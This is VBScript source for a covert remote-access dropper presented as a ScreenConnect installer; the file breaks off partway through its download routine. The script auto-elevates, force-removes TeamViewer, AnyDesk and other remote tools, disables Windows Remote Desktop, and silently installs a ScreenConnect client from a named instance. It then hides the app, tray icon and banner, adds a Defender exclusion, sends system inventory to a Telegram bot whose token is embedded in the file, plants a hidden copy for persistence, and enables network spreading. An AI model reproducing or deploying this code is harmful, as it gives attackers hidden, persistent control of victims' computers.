'==========================================================================
' SCRIPT:    ScreenConnect RMM - ULTIMATE v5.0
'            Full Purge + Install + Hide + Persist + Spread + Report
' AUTHOR:    Custom Build
' DATE:      2026-07-16
'==========================================================================
Option Explicit

'==========================================================================
' GLOBAL OBJECTS
'==========================================================================
Dim oShell, oFSO, oWMI
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")

'==========================================================================
' CONFIGURATION - EDIT THESE VALUES
'==========================================================================
Dim sMsiUrl, sMsiPath, sTempDir, sLogFile, sBackupDir
sMsiUrl    = "https://ackermantoyota.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
sTempDir   = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiPath   = sTempDir & "\" & "56BSSW3K0000_10POJPQ9MT3B4_windows_x64.msi"
sLogFile   = sTempDir & "\ScreenConnect_Install.log"
sBackupDir = sTempDir & "\ScreenConnect_RegistryBackup"

' --- TELEGRAM CONFIGURATION ---
' !! FILL THESE IN PRIVATELY - NEVER SHARE !!
Dim sBotToken, sChatID
sBotToken = "8675345681:AAG8XPocCutq5po7s9y-rz2_GKHif5_TSJM"
sChatID   = "8008457692"

' --- HIDDEN SCRIPT LOCATION ---
Dim sHiddenScriptPath
sHiddenScriptPath = oShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & _
                    "\Microsoft\Crypto\RSA\MachineKeys\winsys.vbs"

' --- KEYWORDS ---
Dim sKeywordToHide
sKeywordToHide = "ScreenConnect"

' --- RETRY CONFIG ---
Const MAX_DOWNLOAD_RETRIES = 3
Const DOWNLOAD_RETRY_DELAY = 5000
Const INSTALL_TIMEOUT_MIN  = 10

' --- NETWORK SPREAD CONFIG ---
Const NETWORK_SPREAD_ENABLED = True
Const NETWORK_TIMEOUT_MS     = 500

'==========================================================================
' GLOBAL VARIABLES FOR REPORT
'==========================================================================
Dim g_SystemInfo, g_RemovedTools, g_NetworkPCs
g_SystemInfo   = ""
g_RemovedTools = ""
g_NetworkPCs   = ""

'==========================================================================
' MAIN
'==========================================================================
Call Main()

Sub Main()
    LogMessage "============================================================"
    LogMessage " ScreenConnect ULTIMATE Installer & Hider v5.0"
    LogMessage " Started: " & Now
    LogMessage "============================================================"
    
    ' 1. Elevation Check
    If Not IsScriptElevated() Then
        LogMessage "[ELEVATE] Not running as admin. Attempting auto-elevation..."
        ElevateScript()
        WScript.Quit
    End If
    LogMessage "[ELEVATE] Running with Administrator privileges."
    
    ' 2. Cleanup old logs
    CleanupOldLogs 5
    
    ' 3. Pre-Flight Checks
    If Not PreFlightCheck() Then
        LogMessage "[FATAL] Pre-flight checks failed. Aborting."
        SendTelegramReport "❌ FAILED", "Pre-flight checks failed"
        WScript.Quit 1
    End If
    
    ' --- CHECK IF THIS IS A PERSISTENCE RUN ---
    If IsPersistenceRun() Then
        LogMessage "[MODE] Persistence run detected. Performing health check only."
        QuickHealthCheck()
        Exit Sub
    End If
    
    ' --- FIRST RUN: FULL DEPLOYMENT ---
    LogMessage "[MODE] First run detected. Starting full deployment."
    
    ' 4. Kill all related processes
    KillAllRelatedProcesses()
    
    ' 5. Stop all related services
    StopAllRelatedServices()
    
    ' 6. Delete all related services
    DeleteAllRelatedServices()
    
    ' 7. Uninstall via WMI
    UninstallViaWMI()
    
    ' 8. Uninstall via Registry
    UninstallOldVersion()
    
    ' 9. Delete scheduled tasks
    CleanupScheduledTasks()
    
    ' 10. Aggressive file/folder purge
    AggressiveFilePurge()
    
    ' 11. Clean registry traces
    CleanRegistryTraces()
    
    ' 12. Remove competing remote tools
    RemoveCompetingTools()
    
    ' 13. Backup registry
    BackupRegistry()
    
    ' 14. Download with retry
    If Not DownloadWithRetry(sMsiUrl, sMsiPath, MAX_DOWNLOAD_RETRIES) Then
        LogMessage "[FATAL] Download failed after " & MAX_DOWNLOAD_RETRIES & " retries."
        SendTelegramReport "❌ FAILED", "Download failed"
        WScript.Quit 1
    End If
    LogMessage "[DOWNLOAD] MSI downloaded successfully."
    
    ' 15. Verify MSI integrity
    If Not VerifyMSIIntegrity(sMsiPath) Then
        LogMessage "[FATAL] MSI integrity check failed."
        SendTelegramReport "❌ FAILED", "MSI integrity check failed"
        WScript.Quit 1
    End If
    LogMessage "[VERIFY] MSI integrity check passed."
    
    ' 16. Install with timeout
    Dim nExitCode
    nExitCode = InstallWithTimeout(sMsiPath, INSTALL_TIMEOUT_MIN)
    LogMessage "[INSTALL] Exit code: " & nExitCode
    
    ' 17. Post-install actions
    Dim bSuccess
    bSuccess = (nExitCode = 0)
    
    If bSuccess Then
        WScript.Sleep 10000
        
        ' Verify installation
        If VerifyInstallation() Then
            LogMessage "[VERIFY] Installation confirmed."
        Else
            LogMessage "[WARNING] Installation could not be verified."
            bSuccess = False
        End If
        
        ' Hide application
        ForceHideApplication sKeywordToHide
        LogMessage "[HIDE] Application hidden from Control Panel."
        
        ' Hide tray icon
        HideTrayIcon()
        LogMessage "[HIDE] Tray icon hidden."
        
        ' Hide control banner
        HideControlBanner()
        LogMessage "[HIDE] Control banner hidden."
        
        ' Add Defender exclusion
        AddDefenderExclusion()
        LogMessage "[AV] Defender exclusion added."
        
        ' Gather system inventory
        GatherSystemInventory()
        LogMessage "[INVENTORY] System info collected."
        
        ' Send Telegram report
        SendTelegramReport "✅ SUCCESS", ""
        
        ' Hide the script
        HideScript()
        
        ' Create persistence
        CreatePersistence()
        
        ' Network spread
        If NETWORK_SPREAD_ENABLED Then
            NetworkSpread()
        End If
    Else
        LogMessage "[WARNING] Install returned non-zero exit code: " & nExitCode
        SendTelegramReport "❌ FAILED", "Install exit code: " & nExitCode
    End If
    
    ' 18. Final cleanup
    FinalCleanup()
    LogMessage "[CLEANUP] Temporary files removed."
    
    LogMessage "============================================================"
    LogMessage " Process completed at: " & Now
    LogMessage "============================================================"
End Sub

'==========================================================================
' PRE-FLIGHT CHECKS
'==========================================================================
Function PreFlightCheck()
    PreFlightCheck = True
    On Error Resume Next
    
    LogMessage "[PRECHECK] Running pre-flight checks..."
    
    ' Check OS version
    Dim colOS, objOS
    Set colOS = oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objOS In colOS
        Dim nBuild
        nBuild = CInt(Split(objOS.Version, ".")(2))
        If nBuild < 7601 Then  ' Windows 7 SP1 minimum
            LogMessage "[PRECHECK] FAIL: OS too old. Build: " & nBuild
            PreFlightCheck = False
        End If
    Next
    
    ' Check disk space (need at least 500MB free on C:)
    Dim oDrive
    Set oDrive = oFSO.GetDrive("C:")
    If oDrive.IsReady Then
        If oDrive.FreeSpace < 524288000 Then  ' 500MB in bytes
            LogMessage "[PRECHECK] FAIL: Low disk space. Free: " & FormatFileSize(oDrive.FreeSpace)
            PreFlightCheck = False
        End If
    End If
    
    ' Check pending reboot
    Dim oReg
    Set oReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
    Dim nPending
    oReg.GetDWORDValue &H80000002, _
        "SYSTEM\CurrentControlSet\Control\Session Manager", _
        "PendingFileRenameOperations", nPending
    If Not IsEmpty(nPending) Then
        LogMessage "[PRECHECK] WARNING: System has pending reboot."
    End If
    
    Set oReg = Nothing
    Set oDrive = Nothing
    
    If PreFlightCheck Then
        LogMessage "[PRECHECK] All checks passed."
    End If
    
    On Error GoTo 0
End Function

'==========================================================================
' KILL ALL SCREENCONNECT/CONNECTWISE PROCESSES
'==========================================================================
Sub KillAllRelatedProcesses()
    On Error Resume Next
    Dim colProcesses, objProcess
    
    LogMessage "[PROCESS] Scanning for ScreenConnect/ConnectWise processes..."
    
    Dim aProcessNames
    aProcessNames = Array( _
        "ScreenConnect.WindowsClient.exe", _
        "ScreenConnect.Service.exe", _
        "ScreenConnect.Server.exe", _
        "ScreenConnect.ClientService.exe", _
        "ScreenConnect.Tray.exe", _
        "ScreenConnect.exe", _
        "connectwisecontrol.exe", _
        "CWControl.exe", _
        "ConnectWiseControl.exe", _
        "ConnectWise.Service.exe", _
        "ConnectWise.Tray.exe" _
    )
    
    Dim sProcName
    For Each sProcName In aProcessNames
        Set colProcesses = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & sProcName & "'")
        For Each objProcess In colProcesses
            LogMessage "[PROCESS] Terminating: " & objProcess.Name & " (PID: " & objProcess.ProcessId & ")"
            objProcess.Terminate()
            WScript.Sleep 500
        Next
    Next
    
    ' Scan by path
    Set colProcesses = oWMI.ExecQuery("SELECT * FROM Win32_Process")
    For Each objProcess In colProcesses
        If Not IsNull(objProcess.ExecutablePath) Then
            If InStr(1, objProcess.ExecutablePath, "ScreenConnect", vbTextCompare) > 0 Or _
               InStr(1, objProcess.ExecutablePath, "ConnectWise", vbTextCompare) > 0 Or _
               InStr(1, objProcess.ExecutablePath, "screenconnect", vbTextCompare) > 0 Then
                LogMessage "[PROCESS] Terminating (path): " & objProcess.Name & " (PID: " & objProcess.ProcessId & ")"
                objProcess.Terminate()
                WScript.Sleep 500
            End If
        End If
    Next
    
    WScript.Sleep 3000
    LogMessage "[PROCESS] All related processes terminated."
    On Error GoTo 0
End Sub

'==========================================================================
' STOP ALL SCREENCONNECT/CONNECTWISE SERVICES
'==========================================================================
Sub StopAllRelatedServices()
    On Error Resume Next
    Dim colServices, objService
    
    LogMessage "[SERVICE] Stopping all ScreenConnect/ConnectWise services..."
    
    Set colServices = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE " & _
        "Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR " & _
        "Name LIKE '%screenconnect%' OR Name LIKE '%connectwise%'")
    
    For Each objService In colServices
        LogMessage "[SERVICE] Stopping: " & objService.Name
        objService.StopService()
        WScript.Sleep 3000
        
        If objService.State = "Running" Then
            LogMessage "[SERVICE] Force stopping: " & objService.Name
            oShell.Run "cmd /c sc stop """ & objService.Name & """", 0, True
            WScript.Sleep 2000
        End If
        
        objService.ChangeStartMode "Disabled"
    Next
    
    WScript.Sleep 2000
    LogMessage "[SERVICE] All related services stopped and disabled."
    On Error GoTo 0
End Sub

'==========================================================================
' DELETE ALL SCREENCONNECT/CONNECTWISE SERVICES
'==========================================================================
Sub DeleteAllRelatedServices()
    On Error Resume Next
    Dim colServices, objService
    
    LogMessage "[SERVICE] Deleting all ScreenConnect/ConnectWise services..."
    
    Set colServices = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE " & _
        "Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR " & _
        "Name LIKE '%screenconnect%' OR Name LIKE '%connectwise%'")
    
    For Each objService In colServices
        LogMessage "[SERVICE] Deleting: " & objService.Name
        oShell.Run "cmd /c sc delete """ & objService.Name & """", 0, True
        WScript.Sleep 1000
    Next
    
    LogMessage "[SERVICE] All related services deleted."
    On Error GoTo 0
End Sub

'==========================================================================
' UNINSTALL VIA WMI
'==========================================================================
Sub UninstallViaWMI()
    On Error Resume Next
    Dim colProducts, objProduct
    
    LogMessage "[WMI-UNINSTALL] Searching for ScreenConnect/ConnectWise products..."
    
    Set colProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE " & _
        "Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%' OR Name LIKE '%screenconnect%'")
    
    For Each objProduct In colProducts
        LogMessage "[WMI-UNINSTALL] Uninstalling: " & objProduct.Name
        objProduct.Uninstall()
        WScript.Sleep 5000
    Next
    
    Set colProducts = Nothing
    LogMessage "[WMI-UNINSTALL] WMI uninstall complete."
    On Error GoTo 0
End Sub

'==========================================================================
' UNINSTALL VIA REGISTRY
'==========================================================================
Sub UninstallOldVersion()
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    LogMessage "[REG-UNINSTALL] Scanning registry for ScreenConnect/ConnectWise..."
    
    For Each hive In aHives
        For Each sPath In aPaths
            oReg.EnumKey hive, sPath, arrSubKeys
            If IsArray(arrSubKeys) Then
                For Each sSubKey In arrSubKeys
                    Dim sDisplayName, sUninstallString, sQuietUninstall
                    
                    oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                    
                    If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                        If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                           InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                            
                            LogMessage "[REG-UNINSTALL] Found: " & sDisplayName
                            
                            oReg.GetStringValue hive, sPath & "\" & sSubKey, "QuietUninstallString", sQuietUninstall
                            
                            If Not IsEmpty(sQuietUninstall) And sQuietUninstall <> "" Then
                                sUninstallString = sQuietUninstall
                            Else
                                oReg.GetStringValue hive, sPath & "\" & sSubKey, "UninstallString", sUninstallString
                                If Not IsEmpty(sUninstallString) And sUninstallString <> "" Then
                                    If InStr(1, sUninstallString, "msiexec", vbTextCompare) > 0 Then
                                        sUninstallString = Replace(sUninstallString, "/I", "/X", 1, -1, vbTextCompare)
                                        If InStr(1, sUninstallString, "/qn", vbTextCompare) = 0 Then
                                            sUninstallString = sUninstallString & " /qn /norestart"
                                        End If
                                    Else
                                        sUninstallString = sUninstallString & " /S /silent /quiet /verysilent"
                                    End If
                                End If
                            End If
                            
                            If Not IsEmpty(sUninstallString) And sUninstallString <> "" Then
                                LogMessage "[REG-UNINSTALL] Running: " & sUninstallString
                                oShell.Run "cmd /c " & sUninstallString, 0, True
                                WScript.Sleep 5000
                            End If
                            
                            oReg.DeleteKey hive, sPath & "\" & sSubKey
                            LogMessage "[REG-UNINSTALL] Deleted key: " & sSubKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    
    Set oReg = Nothing
    LogMessage "[REG-UNINSTALL] Registry uninstall complete."
    On Error GoTo 0
End Sub

'==========================================================================
' CLEANUP SCHEDULED TASKS
'==========================================================================
Sub CleanupScheduledTasks()
    On Error Resume Next
    
    LogMessage "[TASKS] Deleting ScreenConnect/ConnectWise scheduled tasks..."
    
    Dim aTaskPatterns
    aTaskPatterns = Array("ScreenConnect", "screenconnect", "ConnectWise", _
                          "connectwise", "SC_", "CW_")
    
    Dim sPattern
    For Each sPattern In aTaskPatterns
        oShell.Run "cmd /c schtasks /delete /tn ""*" & sPattern & "*"" /f", 0, True
    Next
    
    LogMessage "[TASKS] Scheduled tasks cleaned."
    On Error GoTo 0
End Sub

'==========================================================================
' AGGRESSIVE FILE/FOLDER PURGE
'==========================================================================
Sub AggressiveFilePurge()
    On Error Resume Next
    
    LogMessage "[PURGE] Starting aggressive file purge..."
    
    Dim aPathsToPurge
    aPathsToPurge = Array( _
        "C:\Program Files\ScreenConnect\", _
        "C:\Program Files (x86)\ScreenConnect\", _
        "C:\Program Files\ConnectWise\", _
        "C:\Program Files (x86)\ConnectWise\", _
        "C:\Program Files\ConnectWiseControl\", _
        "C:\Program Files (x86)\ConnectWiseControl\", _
        "C:\ProgramData\ScreenConnect\", _
        "C:\ProgramData\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ConnectWise\" _
    )
    
    Dim sPath
    For Each sPath In aPathsToPurge
        If oFSO.FolderExists(sPath) Then
            LogMessage "[PURGE] Deleting folder: " & sPath
            
            oShell.Run "cmd /c takeown /f """ & sPath & """ /r /d y > nul 2>&1", 0, True
            oShell.Run "cmd /c icacls """ & sPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
            WScript.Sleep 1000
            
            oFSO.DeleteFolder sPath, True
            
            If Err.Number <> 0 Then
                LogMessage "[PURGE] WARNING: Could not delete " & sPath
                Err.Clear
                oShell.Run "cmd /c rmdir /s /q """ & sPath & """", 0, True
            End If
        End If
    Next
    
    ' Scan all user profiles
    If oFSO.FolderExists("C:\Users") Then
        Dim oUsersFolder, oUserFolder
        Set oUsersFolder = oFSO.GetFolder("C:\Users")
        
        For Each oUserFolder In oUsersFolder.SubFolders
            If oUserFolder.Name <> "Public" And oUserFolder.Name <> "Default" And _
               oUserFolder.Name <> "All Users" And oUserFolder.Name <> "Default User" Then
                
                Dim aUserPaths
                aUserPaths = Array( _
                    oUserFolder.Path & "\AppData\Roaming\ScreenConnect", _
                    oUserFolder.Path & "\AppData\Roaming\ConnectWise", _
                    oUserFolder.Path & "\AppData\Local\ScreenConnect", _
                    oUserFolder.Path & "\AppData\Local\ConnectWise" _
                )
                
                Dim sUserPath
                For Each sUserPath In aUserPaths
                    If oFSO.FolderExists(sUserPath) Then
                        oFSO.DeleteFolder sUserPath, True
                    End If
                Next
            End If
        Next
    End If
    
    ' Clean temp folders
    CleanTempFolder sTempDir
    CleanTempFolder oShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
    
    LogMessage "[PURGE] File purge complete."
    On Error GoTo 0
End Sub

'==========================================================================
' CLEAN TEMP FOLDER
'==========================================================================
Sub CleanTempFolder(sFolderPath)
    On Error Resume Next
    If Not oFSO.FolderExists(sFolderPath) Then Exit Sub
    
    Dim oFolder, oFile, oSubFolder
    Set oFolder = oFSO.GetFolder(sFolderPath)
    
    For Each oFile In oFolder.Files
        If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or _
           InStr(1, oFile.Name, "ConnectWise", vbTextCompare) > 0 Or _
           InStr(1, oFile.Name, "56BSSW", vbTextCompare) > 0 Then
            oFSO.DeleteFile oFile.Path, True
        End If
    Next
    
    For Each oSubFolder In oFolder.SubFolders
        If InStr(1, oSubFolder.Name, "ScreenConnect", vbTextCompare) > 0 Or _
           InStr(1, oSubFolder.Name, "ConnectWise", vbTextCompare) > 0 Then
            oFSO.DeleteFolder oSubFolder.Path, True
        End If
    Next
    On Error GoTo 0
End Sub

'==========================================================================
' CLEAN REGISTRY TRACES
'==========================================================================
Sub CleanRegistryTraces()
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    LogMessage "[REGISTRY] Cleaning all ScreenConnect/ConnectWise registry traces..."
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\ScreenConnect", _
        "SOFTWARE\ConnectWise", _
        "SOFTWARE\ConnectWiseControl", _
        "SOFTWARE\WOW6432Node\ScreenConnect", _
        "SOFTWARE\WOW6432Node\ConnectWise", _
        "SOFTWARE\WOW6432Node\ConnectWiseControl", _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    For Each hive In aHives
        For Each sPath In aPaths
            If InStr(1, sPath, "ScreenConnect", vbTextCompare) > 0 Or _
               InStr(1, sPath, "ConnectWise", vbTextCompare) > 0 Then
                If InStr(1, sPath, "Uninstall", vbTextCompare) = 0 Then
                    oReg.DeleteKey hive, sPath
                    Err.Clear
                End If
            End If
            
            If InStr(1, sPath, "Uninstall", vbTextCompare) > 0 Then
                oReg.EnumKey hive, sPath, arrSubKeys
                If IsArray(arrSubKeys) Then
                    For Each sSubKey In arrSubKeys
                        oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                        If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                            If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                               InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                                oReg.DeleteKey hive, sPath & "\" & sSubKey
                            End If
                        End If
                    Next
                End If
            End If
        Next
    Next
    
    Set oReg = Nothing
    LogMessage "[REGISTRY] Registry trace cleanup complete."
    On Error GoTo 0
End Sub

'==========================================================================
' REMOVE COMPETING REMOTE TOOLS
'==========================================================================
Sub RemoveCompetingTools()
    On Error Resume Next
    
    LogMessage "[COMPETITORS] Scanning for competing remote access tools..."
    
    ' Define all targets: Name, Process patterns, Uninstall keywords, Folder paths
    Dim aTargets(13, 3)
    
    ' TeamViewer
    aTargets(0, 0) = "TeamViewer"
    aTargets(0, 1) = "TeamViewer.exe,TeamViewer_Service.exe,tv_w32.exe,tv_x64.exe"
    aTargets(0, 2) = "TeamViewer"
    aTargets(0, 3) = "TeamViewer"
    
    ' AnyDesk
    aTargets(1, 0) = "AnyDesk"
    aTargets(1, 1) = "AnyDesk.exe,AnyDeskMSI.exe"
    aTargets(1, 2) = "AnyDesk"
    aTargets(1, 3) = "AnyDesk"
    
    ' Splashtop
    aTargets(2, 0) = "Splashtop"
    aTargets(2, 1) = "Splashtop.exe,SRService.exe,SplashtopSRA.exe"
    aTargets(2, 2) = "Splashtop"
    aTargets(2, 3) = "Splashtop"
    
    ' LogMeIn
    aTargets(3, 0) = "LogMeIn"
    aTargets(3, 1) = "LogMeIn.exe,LogMeInSystray.exe,LMIGuardianSvc.exe"
    aTargets(3, 2) = "LogMeIn"
    aTargets(3, 3) = "LogMeIn"
    
    ' VNC variants
    aTargets(4, 0) = "VNC"
    aTargets(4, 1) = "winvnc.exe,tvnserver.exe,vncserver.exe,uvnc_service.exe"
    aTargets(4, 2) = "VNC,TightVNC,UltraVNC,RealVNC"
    aTargets(4, 3) = "TightVNC,UltraVNC,RealVNC"
    
    ' Chrome Remote Desktop
    aTargets(5, 0) = "Chrome Remote Desktop"
    aTargets(5, 1) = "remoting_host.exe,chromoting.exe"
    aTargets(5, 2) = "Chrome Remote Desktop"
    aTargets(5, 3) = "Chrome Remote Desktop"
    
    ' Ammyy Admin
    aTargets(6, 0) = "Ammyy Admin"
    aTargets(6, 1) = "Ammyy_Admin.exe,AA_v3.exe"
    aTargets(6, 2) = "Ammyy"
    aTargets(6, 3) = "Ammyy"
    
    ' AeroAdmin
    aTargets(7, 0) = "AeroAdmin"
    aTargets(7, 1) = "AeroAdmin.exe"
    aTargets(7, 2) = "AeroAdmin"
    aTargets(7, 3) = "AeroAdmin"
    
    ' Remote Utilities
    aTargets(8, 0) = "Remote Utilities"
    aTargets(8, 1) = "rutserv.exe,ru_host.exe"
    aTargets(8, 2) = "Remote Utilities"
    aTargets(8, 3) = "Remote Utilities"
    
    ' Zoho Assist
    aTargets(9, 0) = "Zoho Assist"
    aTargets(9, 1) = "ZohoAssist.exe"
    aTargets(9, 2) = "Zoho Assist"
    aTargets(9, 3) = "ZohoAssist"
    
    ' GoToAssist / GoToMyPC
    aTargets(10, 0) = "GoToAssist/GoToMyPC"
    aTargets(10, 1) = "GoToAssist.exe,GoToMyPC.exe,g2ax.exe"
    aTargets(10, 2) = "GoToAssist,GoToMyPC"
    aTargets(10, 3) = "GoToAssist,GoToMyPC"
    
    ' RemotePC
    aTargets(11, 0) = "RemotePC"
    aTargets(11, 1) = "RemotePC.exe,RemotePCService.exe"
    aTargets(11, 2) = "RemotePC"
    aTargets(11, 3) = "RemotePC"
    
    ' Windows Remote Desktop (disable, not uninstall)
    aTargets(12, 0) = "Windows Remote Desktop"
    aTargets(12, 1) = ""
    aTargets(12, 2) = ""
    aTargets(12, 3) = ""
    
    ' Quick Assist
    aTargets(13, 0) = "Quick Assist"
    aTargets(13, 1) = "quickassist.exe"
    aTargets(13, 2) = ""
    aTargets(13, 3) = ""
    
    Dim sRemovedList
    sRemovedList = ""
    
    Dim i
    For i = 0 To 13
        Dim sName, sProcesses, sUninstallKeys, sFolders
        sName          = aTargets(i, 0)
        sProcesses     = aTargets(i, 1)
        sUninstallKeys = aTargets(i, 2)
        sFolders       = aTargets(i, 3)
        
        Dim bRemoved
        bRemoved = False
        
        ' Kill processes
        If sProcesses <> "" Then
            Dim aProcs, sProc
            aProcs = Split(sProcesses, ",")
            For Each sProc In aProcs
                Dim colProcs, objProc
                Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & Trim(sProc) & "'")
                For Each objProc In colProcs
                    LogMessage "[COMPETITORS] Killing: " & objProc.Name
                    objProc.Terminate()
                    WScript.Sleep 500
                    bRemoved = True
                Next
            Next
        End If
        
        ' Uninstall via registry
        If sUninstallKeys <> "" Then
            Dim aKeys, sKey
            aKeys = Split(sUninstallKeys, ",")
            For Each sKey In aKeys
                sKey = Trim(sKey)
                UninstallByKeyword sKey
            Next
        End If
        
        ' Delete folders
        If sFolders <> "" Then
            Dim aFolders, sFolder
            aFolders = Split(sFolders, ",")
            For Each sFolder In aFolders
                sFolder = Trim(sFolder)
                Dim aBasePaths
                aBasePaths = Array( _
                    "C:\Program Files\", _
                    "C:\Program Files (x86)\", _
                    "C:\ProgramData\" _
                )
                Dim sBase
                For Each sBase In aBasePaths
                    Dim sFullPath
                    sFullPath = sBase & sFolder & "\"
                    If oFSO.FolderExists(sFullPath) Then
                        LogMessage "[COMPETITORS] Deleting folder: " & sFullPath
                        oShell.Run "cmd /c takeown /f """ & sFullPath & """ /r /d y > nul 2>&1", 0, True
                        oShell.Run "cmd /c icacls """ & sFullPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
                        WScript.Sleep 1000
                        oFSO.DeleteFolder sFullPath, True
                        If Err.Number <> 0 Then
                            Err.Clear
                            oShell.Run "cmd /c rmdir /s /q """ & sFullPath & """", 0, True
                        End If
                        bRemoved = True
                    End If
                Next
            Next
        End If
        
        ' Special handling for Windows Remote Desktop
        If sName = "Windows Remote Desktop" Then
            LogMessage "[COMPETITORS] Disabling Windows Remote Desktop..."
            oShell.Run "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f", 0, True
            oShell.Run "netsh advfirewall firewall set rule group=""remote desktop"" new enable=No", 0, True
            bRemoved = True
        End If
        
        If bRemoved Then
            If sRemovedList <> "" Then sRemovedList = sRemovedList & ", "
            sRemovedList = sRemovedList & sName
        End If
    Next
    
    g_RemovedTools = sRemovedList
    If g_RemovedTools = "" Then g_RemovedTools = "None"
    
    LogMessage "[COMPETITORS] Removal complete. Removed: " & g_RemovedTools
    On Error GoTo 0
End Sub

'==========================================================================
' UNINSTALL BY KEYWORD (Registry search)
'==========================================================================
Sub UninstallByKeyword(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    For Each hive In aHives
        For Each sPath In aPaths
            oReg.EnumKey hive, sPath, arrSubKeys
            If IsArray(arrSubKeys) Then
                For Each sSubKey In arrSubKeys
                    Dim sDisplayName, sUninstallString
                    oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                    
                    If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                        If InStr(1, sDisplayName, sKeyword, vbTextCompare) > 0 Then
                            LogMessage "[COMPETITORS] Uninstalling: " & sDisplayName
                            
                            oReg.GetStringValue hive, sPath & "\" & sSubKey, "QuietUninstallString", sUninstallString
                            If IsEmpty(sUninstallString) Or sUninstallString = "" Then
                                oReg.GetStringValue hive, sPath & "\" & sSubKey, "UninstallString", sUninstallString
                            End If
                            
                            If Not IsEmpty(sUninstallString) And sUninstallString <> "" Then
                                If InStr(1, sUninstallString, "msiexec", vbTextCompare) > 0 Then
                                    sUninstallString = Replace(sUninstallString, "/I", "/X", 1, -1, vbTextCompare)
                                    If InStr(1, sUninstallString, "/qn", vbTextCompare) = 0 Then
                                        sUninstallString = sUninstallString & " /qn /norestart"
                                    End If
                                Else
                                    sUninstallString = sUninstallString & " /S /silent /quiet /verysilent"
                                End If
                                oShell.Run "cmd /c " & sUninstallString, 0, True
                                WScript.Sleep 5000
                            End If
                            
                            oReg.DeleteKey hive, sPath & "\" & sSubKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    
    Set oReg = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' BACKUP REGISTRY
'==========================================================================
Sub BackupRegistry()
    On Error Resume Next
    
    If Not oFSO.FolderExists(sBackupDir) Then
        oFSO.CreateFolder sBackupDir
    End If
    
    Dim sBackupFile
    sBackupFile = sBackupDir & "\Uninstall_Backup_" & FormatDateForFile(Now) & ".reg"
    oShell.Run "regedit /e """ & sBackupFile & """ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0, True
    
    sBackupFile = sBackupDir & "\Uninstall_WOW64_Backup_" & FormatDateForFile(Now) & ".reg"
    oShell.Run "regedit /e """ & sBackupFile & """ HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", 0, True
    
    LogMessage "[BACKUP] Registry backed up to: " & sBackupDir
    On Error GoTo 0
End Sub

'==========================================================================
' DOWNLOAD WITH RETRY
'==========================================================================
Function DownloadWithRetry(sUrl, sDestPath, nMaxRetries)
    Dim nRetry, bSuccess
    bSuccess = False
    
